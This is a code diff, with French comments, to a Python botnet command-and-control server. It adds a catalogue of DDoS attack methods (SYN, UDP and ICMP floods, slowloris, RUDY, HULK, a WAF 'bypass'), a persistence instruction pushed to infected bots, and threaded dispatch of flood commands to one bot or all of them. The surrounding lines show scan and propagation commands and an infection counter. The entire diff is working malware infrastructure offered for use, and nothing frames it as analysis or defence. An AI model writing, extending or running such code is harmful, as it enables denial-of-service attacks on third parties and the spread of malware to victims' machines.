@@ -14,11 +14,33 @@ PORT = 1337       # Port d'écoute pour le C2
 HTTP_PORT = 80    # Port pour servir les fichiers binaires
 MAX_CONNECTIONS = 9000
 BINARIES_DIR = os.path.dirname(os.path.abspath(__file__))  # Répertoire contenant les binaires
+RECONNECT_INTERVAL = 60  # Intervalle de reconnexion en secondes pour les bots
 
 # Liste pour stocker les bots connectés avec déduplication
 connected_bots = []
 bot_ips = set()  # Pour éviter les doublons
 lock = threading.Lock()
+
+# Dictionnaire des méthodes d'attaque DDoS disponibles
+DDOS_METHODS = {
+    # Layer 4 (Transport)
+    "syn": "Flood SYN - Inonde la cible de paquets SYN sans compléter le handshake TCP",
+    "ack": "Flood ACK - Envoie des paquets ACK sans connexion préalable",
+    "udp": "Flood UDP - Inonde la cible de paquets UDP",
+    "tcp": "Flood TCP - Établit de nombreuses connexions TCP",
+    "icmp": "Flood ICMP - Envoie des paquets ICMP en masse (ping flood)",
+    
+    # Layer 7 (Application)
+    "http": "Flood HTTP - Envoie des requêtes HTTP GET/POST en masse",
+    "slowloris": "Slowloris - Garde des connexions HTTP ouvertes le plus longtemps possible",
+    "rudy": "R-U-Dead-Yet - Soumet des formulaires POST très lentement",
+    "arme": "ARME - Attaque par amplification de réflexion de mémoire",
+    "hulk": "HULK - Génère du trafic HTTP unique pour contourner le cache",
+    
+    # Mixtes
+    "mix": "Mix - Combinaison de plusieurs attaques simultanées",
+    "bypass": "Bypass - Tente de contourner les protections WAF et anti-DDoS"
+}
 
 # Statistiques et état
 total_infections = 0
@@ -88,6 +110,9 @@ def handle_bot(client_socket, address):
                         bot_info['arch'] = 'x86_64'
                     elif 'x86' in bot_info['system_info'].lower():
                         bot_info['arch'] = 'x86'
+                
+                # Envoyer les instructions de persistance
+                client_socket.send(f"PERSIST {RECONNECT_INTERVAL}".encode('utf-8'))
             
             # Ajouter le bot à la liste des connectés
             with lock:
@@ -210,13 +235,9 @@ def command_interface():
         print("6. ddos-all <cible> <durée> [méthode] - Lance une attaque DDoS avec tous les bots")
         print("7. scan <id> <plage> - Scanner une plage d'adresses IP")
         print("8. propagate <id> <cible> - Tente de se propager vers une cible")
-        print("9. clear - Efface l'écran")
-        print("10. exit - Arrête le serveur C2")
-        print("\nMéthodes DDoS disponibles:")
-        print("- slowloris : Garde les connexions ouvertes (optimal pour IoT)")
-        print("- ack      : Flood de paquets ACK (très léger)")
-        print("- http     : Flood HTTP avec rotation d'User-Agents")
-        print("- mix      : Mélange d'attaques légères")
+        print("9. methods - Affiche toutes les méthodes d'attaque disponibles")
+        print("10. clear - Efface l'écran")
+        print("11. exit - Arrête le serveur C2")
         # Afficher uniquement le nombre de bots et les attaques actives - information essentielle
         print(f"\n[*] {len(connected_bots)} bots | {active_ddos} attaques DDoS actives")
         
@@ -277,9 +298,16 @@ def command_interface():
                 if ":" not in target:
                     target = f"{target}:80"  # Port par défaut si non spécifié
                 
+                # Vérifier si la méthode est valide
+                if method.lower() not in DDOS_METHODS:
+                    print(f"[!] Méthode d'attaque inconnue: {method}")
+                    print("[!] Méthodes disponibles: {}".format(", ".join(DDOS_METHODS.keys())))
+                    continue
+                
                 command = f"DDOS {target} {duration} {method}"
-                send_command_to_bot(bot_index, command)
-                print(f"[+] Attaque DDoS lancée depuis le bot {bot_index} vers {target}")
+                # Lancer l'attaque dans un thread séparé pour ne pas bloquer l'interface
+                threading.Thread(target=send_command_to_bot, args=(bot_index, command), daemon=True).start()
+                print(f"[+] Attaque DDoS lancée depuis le bot {bot_index} vers {target} (méthode: {method})")
             except ValueError:
                 print("[!] Format invalide. Utilisez: ddos <id> <cible> <durée> [méthode]")
         
@@ -291,9 +319,16 @@ def command_interface():
             if ":" not in target:
                 target = f"{target}:80"  # Port par défaut si non spécifié
             
+            # Vérifier si la méthode est valide
+            if method.lower() not in DDOS_METHODS:
+                print(f"[!] Méthode d'attaque inconnue: {method}")
+                print("[!] Méthodes disponibles: {}".format(", ".join(DDOS_METHODS.keys())))
+                continue
+            
             command = f"DDOS {target} {duration} {method}"
-            count = broadcast_command(command)
-            print(f"[+] Attaque DDoS lancée depuis {count} bots vers {target}")
+            # Lancer l'attaque dans un thread séparé pour ne pas bloquer l'interface
+            threading.Thread(target=lambda: broadcast_command(command), daemon=True).start()
+            print(f"[+] Attaque DDoS lancée vers {target} (méthode: {method})")
         
         elif cmd_parts[0] == "scan" and len(cmd_parts) > 2:
             try:
@@ -337,6 +372,20 @@ def command_interface():
         
         elif cmd_parts[0] == "clear":
             os.system('cls' if os.name == 'nt' else 'clear')
+        
+        elif cmd_parts[0] == "methods":
+            print("\n=== Méthodes d'attaque DDoS disponibles ===")
+            print("\nLayer 4 (Transport):")
+            for method, desc in {k: v for k, v in DDOS_METHODS.items() if k in ["syn", "ack", "udp", "tcp", "icmp"]}.items():
+                print(f"- {method}: {desc}")
+            
+            print("\nLayer 7 (Application):")
+            for method, desc in {k: v for k, v in DDOS_METHODS.items() if k in ["http", "slowloris", "rudy", "arme", "hulk"]}.items():
+                print(f"- {method}: {desc}")
+            
+            print("\nMixtes:")
+            for method, desc in {k: v for k, v in DDOS_METHODS.items() if k in ["mix", "bypass"]}.items():
+                print(f"- {method}: {desc}")
         
         elif cmd_parts[0] == "exit":
             print("[!] Arrêt du serveur...")
